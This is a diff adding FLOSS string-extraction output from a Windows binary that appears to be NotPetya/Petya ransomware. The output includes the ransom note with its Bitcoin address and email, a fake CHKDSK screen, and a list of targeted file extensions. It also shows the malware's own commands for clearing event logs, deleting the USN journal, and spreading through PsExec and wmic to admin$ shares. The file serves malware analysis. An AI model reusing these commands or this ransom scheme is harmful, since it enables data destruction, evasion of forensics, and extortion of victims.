@@ -1,0 +1,509 @@
+FLOSS static ASCII strings
+!This program cannot be run in DOS mode.
+HpSW;HxuE
+D$<9t$<r
+u(9X0t)9X
+Fast decoding Code from Chris Anderson
+invalid literal/length code
+invalid distance code
+invalid distance too far back
+incorrect header check
+unknown compression method
+invalid window size
+unknown header flags set
+header crc mismatch
+invalid block type
+invalid stored block lengths
+too many length or distance symbols
+invalid code lengths set
+invalid bit length repeat
+invalid code -- missing end-of-block
+invalid literal/lengths set
+invalid distances set
+invalid literal/length code
+invalid distance code
+invalid distance too far back
+incorrect data check
+incorrect length check
+[-&LMb#{'
+)\ZEo^m/
+need dictionary
+stream end
+file error
+stream error
+data error
+insufficient memory
+buffer error
+incompatible version
+ inflate 1.2.8 Copyright 1995-2013 Mark Adler 
+\\.\PhysicalDrive
+123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
+1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
+%3%2%1%075613244
+ddddddd,U
+`dddddd,gi
+<<:;9>=?%8%9%:%;,
+lddddddd5,
+dedd9=>?
+ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddLgddDddd
+dddlgdd(ddd
+dddddddd
+kjddddd7132%0%1%2%3,
+$ddddddd-
+dTdddddd,U
+fddddddd
+$ddddddd,
+dddddddd,
+dddddddd,
+ndddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,
+ddddddddddddddddddddddddddddddddddddddddddddddddd367,
+$ddddddd-
+dTdddddd,
+$ddddddd-
+dTdddddd,
+Lddddddd6,
+lddddddd,
+eddddddd,
+lddddddd,
+addddddd,
+lddddddd,
+gddddddd,
+Lddddddd6,
+ddddddd,
+dddfddd-
+ddd`ddd,
+ddd$ddd,
+dddddddd
+eddddddd,
+dddddddd,
+kddddddd,
+dddddddd,
+lddddddd,
+h9?:;>,e
+dddd3675,
+lddddddd,
+hddddddd,
+kddddddd,
+$ddddddd-
+dTdddddd,
+kddddddd
+eddddddd
+eddddddd
+ddddddddddddddddddddddddzdddEidd*idddmddd:idddddddddd
+medd0156723,U
+<%;%:%9%8:;9?
+w22222222
+E4'4t3333'=O
+w22222222
+IsWow64Process
+GetExtendedTcpTable
+ntdll.dll
+NtRaiseHardError
+\\.\PhysicalDrive0
+255.255.255.255
+%u.%u.%u.%u
+CreateFileA
+HeapAlloc
+SetFilePointerEx
+HeapFree
+GetProcessHeap
+WriteFile
+ReadFile
+GetSystemDirectoryA
+GetLastError
+DeviceIoControl
+CloseHandle
+FindFirstFileW
+MapViewOfFile
+UnmapViewOfFile
+GetDriveTypeW
+WaitForSingleObject
+GetLogicalDrives
+FlushViewOfFile
+CreateFileW
+GetFileSizeEx
+FindClose
+LocalAlloc
+CreateFileMappingW
+FindNextFileW
+LocalFree
+CreateThread
+GetTickCount
+MultiByteToWideChar
+LeaveCriticalSection
+SetLastError
+EnterCriticalSection
+HeapReAlloc
+InitializeCriticalSection
+InterlockedExchange
+GetTempFileNameW
+PeekNamedPipe
+CreateProcessW
+GetCurrentProcess
+ConnectNamedPipe
+GetModuleHandleW
+CreateNamedPipeW
+TerminateThread
+DisconnectNamedPipe
+FlushFileBuffers
+GetTempPathW
+GetProcAddress
+DeleteFileW
+FreeLibrary
+GlobalAlloc
+LoadLibraryW
+GetComputerNameExW
+GlobalFree
+ExitProcess
+GetVersionExW
+GetModuleFileNameW
+DisableThreadLibraryCalls
+ResumeThread
+GetEnvironmentVariableW
+GetFileSize
+SetFilePointer
+FindResourceW
+LoadResource
+GetCurrentThread
+OpenProcess
+GetSystemDirectoryW
+SizeofResource
+GetLocalTime
+Process32FirstW
+LockResource
+Process32NextW
+GetModuleHandleA
+lstrcatW
+CreateToolhelp32Snapshot
+GetWindowsDirectoryW
+VirtualFree
+VirtualAlloc
+LoadLibraryA
+VirtualProtect
+WideCharToMultiByte
+GetExitCodeProcess
+WaitForMultipleObjects
+KERNEL32.dll
+wsprintfW
+ExitWindowsEx
+wsprintfA
+USER32.dll
+CryptReleaseContext
+CryptAcquireContextA
+CryptGenRandom
+CryptExportKey
+CryptAcquireContextW
+CryptSetKeyParam
+CryptImportKey
+CryptEncrypt
+CryptGenKey
+CryptDestroyKey
+InitializeSecurityDescriptor
+SetSecurityDescriptorDacl
+CredFree
+CredEnumerateW
+SetThreadToken
+OpenProcessToken
+LookupPrivilegeValueW
+AdjustTokenPrivileges
+GetSidSubAuthority
+OpenThreadToken
+GetSidSubAuthorityCount
+GetTokenInformation
+SetTokenInformation
+DuplicateTokenEx
+InitiateSystemShutdownExW
+CreateProcessAsUserW
+ADVAPI32.dll
+CommandLineToArgvW
+SHGetFolderPathW
+SHELL32.dll
+StringFromCLSID
+CoCreateGuid
+CoTaskMemFree
+ole32.dll
+CryptDecodeObjectEx
+CryptStringToBinaryW
+CryptBinaryToStringW
+CRYPT32.dll
+PathFindExtensionW
+StrStrIW
+PathCombineW
+StrToIntW
+StrCmpIW
+PathFileExistsW
+PathFindFileNameW
+PathAppendW
+SHLWAPI.dll
+GetIpNetTable
+GetAdaptersInfo
+IPHLPAPI.DLL
+WS2_32.dll
+WNetCloseEnum
+WNetOpenEnumW
+WNetEnumResourceW
+WNetCancelConnection2W
+WNetAddConnection2W
+NetServerEnum
+NetApiBufferFree
+NetServerGetInfo
+NETAPI32.dll
+DhcpRpcFreeMemory
+DhcpGetSubnetInfo
+DhcpEnumSubnets
+DhcpEnumSubnetClients
+DHCPSAPI.DLL
+msvcrt.dll
+perfc.dat
+bHbGcDiHpY`
+!This program cannot be run in DOS mode.
+FindResourceW
+LoadResource
+CreateProcessW
+HeapAlloc
+HeapFree
+GetProcessHeap
+WriteFile
+SizeofResource
+CreateFileW
+LockResource
+CloseHandle
+KERNEL32.dll
+IsProcessorFeaturePresent
+'020D0S0^0o0
+0&1B1N1x1
+2,3D3K3S3X3\3`3
+3:4@4D4H4L4
+575i5p5t5x5|5
+!This program cannot be run in DOS mode.
+CreateProcessW
+CloseHandle
+WriteFile
+CreateFileW
+HeapFree
+HeapAlloc
+GetProcessHeap
+SizeofResource
+LockResource
+LoadResource
+FindResourceW
+KERNEL32.dll
+p"1R<7&%= 9R" =5 3?RC\Brp>3<?3<C\Brp%
+rp>?C\@*BB@rp>3<?3<@\Crp<&R>?RB\C@r
+sSsAsCsCsCsSsAsBsJsFsss$s
+sSsAsCsCsCsSsFs]sCsss
+u)u)uDuGuFu[uDuGu[uFuDu[uGu)u<u%u6uQuuuJJJJJu
+%y%u%l%u%`%y%%%%% %.&5%%%m%%%$%%%
+5%%%%$%%%%%$%
+'$G%%%%!x
+0123456789abcdef
+  Repairing file system on C: 
+  The type of the file system is NTFS.
+  One of your disks contains errors and needs to be repaired. This process
+  may take several hours to complete. It is strongly recommended to let it
+  complete.
+  WARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS, YOU COULD
+  DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED
+  CHKDSK is repairing sector
+Please reboot your computer!
+ Decrypting sector
+ Ooops, your important files are encrypted.
+ If you see this text, then your files are no longer accessible, because they
+ have been encrypted.  Perhaps you are busy looking for a way to recover your
+ files, but don't waste your time.  Nobody can recover your files without our
+ decryption service.
+ We guarantee that you can recover all your files safely and easily.  All you
+ need to do is submit the payment and purchase the decryption key.
+ Please follow the instructions:
+ 1. Send $300 worth of Bitcoin to following address:
+ 2. Send your Bitcoin wallet ID and personal installation key to e-mail
+    wowsmith123456@posteo.net. Your personal installation key:
+ If you already purchased your key, please enter it below.
+ Incorrect key! Please try again.
+nt_c>8ubN
+<GxpS)wN
+l]$vz6s{,
+%<PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGX
+3!3B3V3`3w3
+4?4E4b4u4
+7)727F7Z7m7
+8	9&949;9D9M9
+;0;B;h;v;
+<'<\<h<q<
+>:>H>[>i>|>
+>0???M?X?h?
+6'676M6S6a6l6v6
+7.797@7I7N7p7u7~7
+2$2*202b2t2y2
+4$4+444D4N4V4
+5D5b5i5o5
+6;6D6r6y6
+8 9(999?9H9P9X9]9
+9"</<|</>
+3"4,41484=4
+8 9D9K9u9{9
+;1;8;j;p;
+<;<\<a<g<
+1&131[1z1
+4)4=4R4p4
+5!5*535^5c5h5s5z5
+6#6N6Y6o6w6
+7F7O7l7s7
+8F8M8U8^8t8
+<'<2<Q<k<s<
+=#=)=G=M=}=
+> >->>>C>J>T>Y>_>e>s>
+?=?J?W?c?u?
+0+080P0g0p0
+1*161=1\1d1j1s1z1
+2$262V2y2
+2%3-333<3I3
+455B5O5b5h5o5
+9+959e9|9
+:%:G:M:S:[:h:n:
+;.;?;F;N;T;e;|;
+=>=G=N=u={=
+= >7>U>\>r>
+/0@0j0{0
+5 5+5D5Q5Z5a5f5
+556>6V6v6
+7#8.8<8A8U8
+;;;V;];z;r<z<
+<!=-=T=d=x=
+?-?:?J?R?[?
+273W3k3}3
+: :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\:
+0!0-0<0T0[0g0v0
+1'1?1F1R1a1
+`=d=h=l=p=t=x=|=
+;4<8<<<@<D<H<L<
+"Copyright (c) 1997 Microsoft Corp.1
+Microsoft Corporation1!0
+Microsoft Root Authority0
+070822223102Z
+120825070000Z0y1
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Code Signing PCA0
+"Copyright (c) 1997 Microsoft Corp.1
+Microsoft Corporation1!0
+Microsoft Root Authority
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Code Signing PCA0
+091207224029Z
+110307224029Z0
+Washington1
+Redmond1
+Microsoft Corporation1
+Microsoft Corporation0
+3http://crl.microsoft.com/pki/crl/products/CSPCA.crl0H
+,http://www.microsoft.com/pki/certs/CSPCA.crt0
+"Copyright (c) 1997 Microsoft Corp.1
+Microsoft Corporation1!0
+Microsoft Root Authority0
+060916010447Z
+190915070000Z0y1
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Timestamping PCA0
+"Copyright (c) 1997 Microsoft Corp.1
+Microsoft Corporation1!0
+Microsoft Root Authority
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Timestamping PCA0
+080725190115Z
+130725191115Z0
+Washington1
+Redmond1
+Microsoft Corporation1
+MOPR1'0%
+nCipher DSE ESN:85D3-305C-5BCF1%0#
+Microsoft Time-Stamp Service0
+3http://crl.microsoft.com/pki/crl/products/tspca.crl0H
+,http://www.microsoft.com/pki/certs/tspca.crt0
+z?*[FS	<
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Code Signing PCA
+*http://technet.microsoft.com/sysinternals 0
+Washington1
+Redmond1
+Microsoft Corporation1#0!
+Microsoft Timestamping PCA
+100427180659Z0#
+
+FLOSS static Unicode strings
+#+3;CScs
+	Your personal installation key:
+wowsmith123456@posteo.net.
+2.	Send your Bitcoin wallet ID and personal installation key to e-mail 
+1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
+Ooops, your important files are encrypted.
+If you see this text, then your files are no longer accessible, because
+they have been encrypted. Perhaps you are busy looking for a way to recover
+your files, but don't waste your time. Nobody can recover your files without
+our decryption service.
+We guarantee that you can recover all your files safely and easily.
+All you need to do is submit the payment and purchase the decryption key.
+Please follow the instructions:
+1.	Send $300 worth of Bitcoin to following address:
+MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB
+C:\Windows;
+.3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.
+Microsoft Enhanced RSA and AES Cryptographic Provider
+README.TXT
+ "%ws:%ws"
+kernel32.dll
+\\.\pipe\%ws
+"%ws" %ws
+iphlpapi.dll
+e%u.%u.%u.%u
+TERMSRV/
+127.0.0.1
+localhost
+SeTcbPrivilege
+SeShutdownPrivilege
+SeDebugPrivilege
+C:\Windows\
+\cmd.exe
+wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:
+schtasks %ws/Create /SC once /TN "" /TR "%ws" /ST %02d:%02d
+at %02d:%02d %ws
+shutdown.exe /r /f
+/RU "SYSTEM" 
+dllhost.dat
+u%s \\%s -accepteula -s 
+-d C:\Windows\System32\rundll32.exe "C:\Windows\%s",#1 
+wbem\wmic.exe
+%s /node:"%ws" /user:"%ws" /password:"%ws" 
+process call create "C:\Windows\System32\rundll32.exe \"C:\Windows\%s\" #1 
+\\%s\admin$
+\\%ws\admin$\%ws
+c:\Windows\
+rundll32.exe 
+rundll32.exe 
+c:\Windows\
+<<<Obsolete>>
+,Sysinternals Utilitie
+
+
+FLOSS decoded 7 strings
+A_A^A]A\^_][
+WVSUATAUAVAWI
+A_A^A]A\][^_
+PSQRVWUAPAQARASATAUAVAWj+e
+xA_A^A]AZAYAX]_^ZY[XeH
+PPh.datja
+SUWVATAUAVAWH
+
+FLOSS extracted 1 stackstrings
+\\.\PhysicalDrive
+
+Finished execution after 6.501000 seconds
